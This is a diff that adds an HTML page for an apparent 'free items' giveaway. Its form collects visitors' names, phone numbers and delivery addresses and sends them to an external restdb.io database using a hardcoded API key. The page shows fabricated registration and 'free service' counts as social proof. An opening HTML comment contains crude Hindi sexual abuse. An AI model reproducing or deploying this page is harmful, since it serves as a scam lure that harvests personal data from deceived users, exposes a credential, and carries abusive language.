@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="en">
+ <!--
+
+तेरी मा को तेल लगाकर चोदूंगा रण्डी की औलाद चोर भोसडीके, गांड मरा लवडे
+
+-->
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+ <script src="js/jquery.min.js" ></script>
+ <script src="js/bootstrap.min.js" ></script>
+    <script src="js/vue.min.js" ></script>
+  </head>
+
+  <body class="bg-dark">
+  	
+<div id="app" class="container mt-4 mb-4">
+  <title>{{title}}</title>
+  <nav class="navbar navbar-expand-lg navbar-light " style="background-color: #17a2b8;">
+    <a class="navbar-brand" style="color:white;" href="/">{{title}}</a>
+    <button style="color:white;" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+      <div class="navbar-nav">
+        <a style="color:white;" class="nav-item nav-link" v-for="nav in menu" v-bind:href="nav.link">{{nav.name}}</a>
+      </div>
+    </div>
+  </nav>
+
+
+<div class="card">
+
+<div class="card-body">
+
+<div class="container">
+    <img class="img-thumbnail" style=" display: block; margin-left: auto; margin-right: auto;" v-bind:src="img">
+</div>
+
+<hr>
+
+
+
+<ul class="list-group">
+<li class="list-group-item bg-info text-white">
+Fill Up the Form
+</li>
+
+
+<li class="list-group-item">
+
+<input type="text" name="name" class="form-control name" placeholder="Enter You Name.....">
+
+<input type="text" name="number" class="form-control mt-2 mobile" placeholder="Enter You Number.....">
+
+<textarea name="address" class="form-control mt-2 address" placeholder="Your Delivery Address..."></textarea>
+
+<input onclick="submit()" class="btn btn-success btn-block mt-2" value="Submit">
+
+</li>
+
+
+</ul>
+
+
+<hr>
+
+<ul class="list-group mt-2">
+<li v-for="item in features" class="list-group-item">{{item}}</li>
+</ul>
+
+<hr>
+
+
+
+<ul class="list-group">
+<li class="list-group-item bg-info text-white">
+Users Registered Upto Now for {{title}}
+</li>
+
+<li class="list-group-item">
+Total Names : <span class="badge badge-info">18,670</span>
+</li>
+
+<li class="list-group-item">
+Who got Free Service : <span class="badge badge-info">9,700</span>
+</li>
+
+
+</ul>
+
+<hr>
+
+<a href="#" target="_blank">© NitroWishes.tech</a>
+
+
+
+</div></div>
+</div>
+
+
+
+<script src="app.js" ></script>
+   <script>
+     function submit(){
+   var jsondata = {"name": $(".name").val(),"mobile": $(".mobile").val(), "address": $(".address").val()};
+var settings = {
+  "async": true,
+  "crossDomain": true,
+  "url": "https://freepubgitems-3163.restdb.io/rest/users",
+  "method": "POST",
+  "headers": {
+    "content-type": "application/json",
+    "x-apikey": "5cb77e42814cf932876732e8",
+    "cache-control": "no-cache"
+  },
+  "processData": false,
+  "data": JSON.stringify(jsondata)
+}
+
+$.ajax(settings).done(function (response) {
+  alert(JSON.stringify(response));
+});
+     }
+   </script>
+   </body>
+</html>
